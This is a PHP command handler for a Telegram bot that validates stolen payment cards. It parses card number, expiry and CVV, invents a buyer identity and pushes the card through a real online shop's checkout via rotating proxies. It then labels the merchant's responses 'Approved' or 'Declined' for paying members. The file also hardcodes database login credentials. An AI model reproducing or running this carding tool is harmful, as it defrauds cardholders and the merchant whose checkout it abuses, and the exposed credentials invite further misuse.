<?php
list($cmd) = explode(" ", $message);
if($cmd == "/am" or $cmd == ".am" or $cmd == "!am"){
 $tiempo_inicial = microtime(true);
        deleteprm($userId);
    $Mi_Id = "5168647868";
    $lista = substr($message, 4);
    unlink(getcwd().'/cookie.txt');
    if (empty($lista)){
    bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>Arman Charged 5$
Format: <code>cc|m|y|cvv</code></b>"
                ]); 
        die();
    }
    $bin = substr($lista, 0,6);
    $bines = bannedbin($bin);
        if($bines == true){
            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
            exit();
        }
$input ='Arman';
is_gateroff($input);
if($userId == verifniBan($userId)){
    sendMessage($chatId,$keyboard,"<b>🚷- [Status Ban] Te Encuentra ban no puedes hacer uso de ningún comando del bot%0AID : $userId</b>.");
    die();
}
if ($userId != $Mi_Id ){
    if( $userId != verifiPremium($userId)){
        if($userId != verifiAdmin($userId)){
			if($userId != veritimepremium($userId)){
			bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>Hello this chat is not Authorized
❄️ Buy a membership to make use of this commands
═══════════════════════
↯ Contact A Owner or a Seller</b>",
                'reply_markup'=> json_encode(['inline_keyboard'=>[
                    [['text'=>"🝂 𝗥𝗶𝘁𝗮 𝗖𝗵𝗲𝗰𝗸「𝑹𝒚𝒌」 ",'url'=>"https://t.me/+9PVHHRlmIgQ3Yzhh"]]
                    ],'resize_keyboard'=>true])
                ]);       
    die();
}}}}


$nui = infouser($userId);
    $Rank = $nui['apodo'];
if($gId == $Mi_Id){
    $Rank = "Owner";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == verifiAdmin($userId)){
    $Rank ="Admin";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == veritimepremium($userId)){
   $Rank = $nui['apodo'];
}elseif($chatId == verifiCharAdmin($chatId)){
    $Rank = "Free User";
    $GLOBALS['Rank'] = $Rank;
}
elseif($userId == verifiUser($userId)){
    $Rank ="Free user";
    $GLOBALS['Rank'] =$Rank;
}

$lista = clean($lista);
$check = strlen($lista);
if(preg_match_all("/(\d{15,16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $lista, $matches)) {
    $lista = $matches[0][0]; 
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;


$chem = substr($cc, 0,1);
$vaut = array(1,2,7,8,9,0,3,6);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,'<b>Este bot solo soporta Visa, MasterCard.</b>');
    exit();
  }
$antispmatim = antispamCheck($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
$antispmatim = antispamCheckperemium($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
    $cc3 = substr($cc, 0,6);
$res = bininfo($cc3);
$bin1 = binnumber($cc3);
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];
if($userId == veritimepremium($userId)){
    goto j;
    if($userId == '5168647868'){
        goto j;
        if($userId == '5754215978'){
        goto j;
        }}}
if($scheme == 'PREPAID'){
    reply_to($chatId,$message_id,$keyboard,"<b>Binned Prepaid can only be verified in Private</b>.");
    die();
}
j:
$ccincore = Luhn($cc);
if($ccincore == 'ERROR'){
    reply_to($chatId,$message_id,$keyboard,"<b>Incorrect Credit Card Number</b>");
    die();
}
$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » Arman
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);
$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);



$rotate = rotate();
$socks5 = socks5();
//////////////////////=[Proxy Section]=///////////////// 


  


#------[CURL-2]------#
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ WAIT A FEW SECONDS 🟨 ]
Gateway » Arman
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


//////////////////////////////=================[Join @TechHacksBySoham For More Stuff]=================/////////////////////////
$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://healthfree.com/shop/index.php?l=addtocart');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: healthfree.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://healthfree.com';
$headers[] = 'Referer: https://healthfree.com/shop/index.php?l=product_detail&p=134';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'product%5Bid%5D=134&regid=&product%5Bquantity%5D=1');
$curl = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://healthfree.com/shop/index.php?l=checkout');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: healthfree.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://healthfree.com/shop/index.php?l=cart_view&added_id=134';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
						

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://healthfree.com/shop/checkout.php?l=guest_one');
$headers = array();
$headers[] = 'Host: healthfree.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://healthfree.com';
$headers[] = 'Referer: https://healthfree.com/shop/checkout.php?';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);


$data = [
    'userinfo' => [
        'ship_oset' => 0,
        'cart_contents' => '(1)+SB:Kidney+Con',
        'ship_first_name' => $firstname,
        'ship_last_name' => $lastname,
        'ship_company_name' => 'Curol',
        'ship_address1' => 'street '.rand(1111,9999),
        'ship_address2' => '',
        'ship_city' => 'New York',
        'ship_state' => 'NY',
        'ship_other' => '',
        'ship_zip' => '10080',
        'ship_country' => 'US',
        'email' => $email,
        'phone' => $phone,
        'use_contact_info' => '',
        'bill_same' => '',
        'other_first_name' => '',
        'other_last_name' => '',
        'other_email' => '',
        'other_phone' => ''
    ]
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://healthfree.com/shop/checkout.php?l=guest_one');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: healthfree.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://healthfree.com';
$headers[] = 'Referer: https://healthfree.com/shop/checkout.php?l=guest_one';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(($data)));
$curl = curl_exec($ch);
$shipping = getStr($curl, '<input  type=radio name="order[shipping]" value="', '"');
$shipping = json_decode('"' . $shipping . '"');
//echo $shipping;

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://healthfree.com/shop/checkout.php?l=guest_two');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /shop/checkout.php?l=guest_two HTTP/2';
$headers[] = 'Host: healthfree.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://healthfree.com';
$headers[] = 'Referer: https://healthfree.com/shop/checkout.php?l=guest_two';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'order%5Bshipping%5D=&order%5Bshipping%5D='.urlencode($shipping).'&pay_method=credit_card');
$curl = curl_exec($ch);


$tarjetas = ["4" => "visa","5" => "Mastercard","3" => "American Express","6" => "Discover"];
$br = $tarjetas[substr($cc, 0,1)];


if ($mes < 10) {
    $mes = substr($mes, -1);
    }

    
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://healthfree.com/shop/checkout.php?l=guest_three');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: healthfree.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://healthfree.com';
$headers[] = 'Referer: https://healthfree.com/shop/checkout.php?l=guest_three';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'userinfo%5Bbill_same%5D=&userinfo%5Bbill_first_name%5D=&userinfo%5Bbill_last_name%5D=&userinfo%5Bbill_company_name%5D=&userinfo%5Bbill_address1%5D=&userinfo%5Bbill_address2%5D=&userinfo%5Bbill_city%5D=&userinfo%5Bbill_state%5D=&userinfo%5Bbill_other%5D=&userinfo%5Bbill_zip%5D=&userinfo%5Bbill_country%5D=US&userinfo%5Bbill_oset%5D=0&order%5Bgiftcert%5D=&order%5Bcc_name_on_card%5D='.$firstname.'+'.$lastname.'&order%5Bcc_card_no%5D='.$cc.'&order%5Bcc_card_type%5D='.$br.'&order%5Bcc_cvv2%5D='.$cvv.'&order%5Bcc_expir_month%5D='.$mes.'&order%5Bcc_expir_year%5D='.$ano.'');
$curl = curl_exec($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://healthfree.com/shop/checkout.php?l=guest_four');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: healthfree.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://healthfree.com';
$headers[] = 'Referer: https://healthfree.com/shop/checkout.php?l=guest_four';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'order%5Bcomments%5D=');
$result2 = curl_exec($ch);
$error = strip_tags(getStr($result2, '<div class="error_alert"><strong>', '<div style="height: 5px;">'));
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}


bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » Arman
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);



if ((strpos($result2, "44 This transaction has been declined.")) || (strpos($result2, "This transaction cannot be processed. Please enter a valid Credit Card Verification Number.")) || (strpos($result2, "The verification code you entered did not match what was on file for your payment card"))){
$status = "Approved! 🟩";
$response = "44 This transaction has been declined.🟩";
}elseif ((strpos($result2, 'Insufficient funds available')) || (strpos($result2, 'insufficient_funds'))){ 
$status = "Approved!🟩";
$response = "Insufficient funds available🟩";
}
elseif(strpos($result2, 'thanks')){ 
$status = "Approved🟩";
$response = 'Charged ($5)';
}elseif (strpos($result2, 'Failed AVS Check')){ 
$status = "PreCharged🟩";
$response = 'Failed AVS Check🟩';
}elseif (strpos($result2, "card_error_authentication_required") ||(strpos($result2,'three_d_secure_redirect'))){ 
$status = "[ DECLINED 🔴 ]";
$response = "3D Card.❌";
}elseif (strpos($result2, "try_again_later")){ 
$status = "[ DECLINED 🔴 ]";
$response = "try_again_later";
}elseif (strpos($result2, "do_not_honor")){ 
$status = "[ DECLINED 🔴 ]";
$response = "do_not_honor";
}elseif (strpos($result2, 'he transaction total has been updated to reflect added tax based on your shipping country. Please review the new total and confirm your payment.') || (strpos($result2,"Verification steps confirmed. Your payment is processing"))) {
    $status = "Approved!🟩";
    $response = "Card Approved🟩";
}
elseif (strpos($result2, "invalid_account")){ 
$status = "[ DECLINED 🔴 ]";
$response = "invalid_account";

}elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "Your card does not support this type of purchase🟥";
}elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "<b>LOST CARD</b>";
  }
  elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
    $status = "<b>[ DECLINED 🔴 ]</b>";
    $response = "<b>FRAUDULENT CARD</b>";
  }elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
    $status = "<b>CARD EXPIRED ❌</b>";
    $response = "<b>EXPIRED CARD</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>INVALID CARD ❌</b>";
    $response = "<b>INCORRECT NUMBER</b>";
  }
  elseif ((strpos($result2, 'Sorry, there was an error completing your purchase -- please try again.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>[ DECLINED 🔴 ]</b>";
    $response = "<b>try again</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'incorrect-number')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>[ DECLINED 🔴 ]</b>";
$response = "<b>INCORRECT NUMBER</b>";
}elseif (strpos($result2, "generic_decline")){
$status = "<b>[ DECLINED 🔴 ]</b>";
$response = "<b>GENERIC DECLINE</b>";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$error";
   }
   bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card - 🝂 <code>$cc|$mes|$ano|$cvv</code> 
Status - 🝂 $status
Response - 🝂 $response 
Gateway - 🝂 Arman 
－－－－－－－－－－－－－－－－
[ INFO BIN CARD ]
Bin - 🝂 <code>$brand</code> - <code>$scheme</code> - <code>$type</code> 
Bank - 🝂 <code>$bank </code> 
Country - 🝂 <code>$country </code>$emoji 
－－－－－－－－－－－－－－－－
Proxy  - 🝂 Live! ✅ 
Time in Progress - 🝂 $tiempo s
Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]
Bot by  - 🝂 Thkss
－－－－－－－－－－－－－－－－</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
$timest = time();
$link = mysqli_connect("mysql-liam.alwaysdata.net", "liam_fredao", "ñOmKvSDu45FswdB5WLD0", "liam_druk");
    $sql = "UPDATE antispam set last_checked_on = '".time()."' WHERE userid = '$gId'";
    $result21 = mysqli_query($link, $sql);
    $sql = "UPDATE antispampremiun set last_checked_on = '".time()."' WHERE userid = '$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
die();
}}

?>
